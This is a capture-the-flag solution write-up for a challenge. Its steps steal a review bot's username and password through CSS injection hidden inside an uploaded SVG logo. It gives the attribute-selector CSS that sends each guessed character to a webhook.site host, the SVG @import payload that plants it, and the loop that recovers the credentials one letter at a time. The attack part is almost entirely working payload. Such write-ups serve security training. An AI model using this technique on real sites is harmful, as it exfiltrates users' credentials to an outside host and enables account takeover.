## SVG Solution
### Author: Daffainfo

1. Use webhook and host this css file
```css
input#uname[value^="a"]{background:url("https://webhook.site/XXXX/u?a")}
input#uname[value^="b"]{background:url("https://webhook.site/XXXX/u?b")}
...one line per character, a-z A-Z 0-9 and symbols...
input#passwd[value^="a"]{background:url("https://webhook.site/XXXX/p?a")}
...same for passwd...
```
2. Plant it: on `/brand-kit`, paste into Logo SVG and submit:
```
<svg xmlns="http://www.w3.org/2000/svg"><style><g/>@import "https://webhook.site/XXXX/x.css";</style></svg>
```
3. Note the `{id}` you get redirected to.
4. Trigger the bot: on `/brand-kit/{id}` click Request Review. Wait  for around 30s.
5. Read webhook.site:
  - `u?<char>` = first letter of username
  - `p?<char>` = first letter of password.
6. Extend one letter: in the webhook body, prepend the letter you learned to that field's selectors, e.g. after learning c for username, change every `value^="` -> `value^="c`. Save. Click Request Review again -> get the next letter. Repeat until no new letters come.
7. Log in: go to `/portal/{id}/login`, type the recovered username + password and got flag

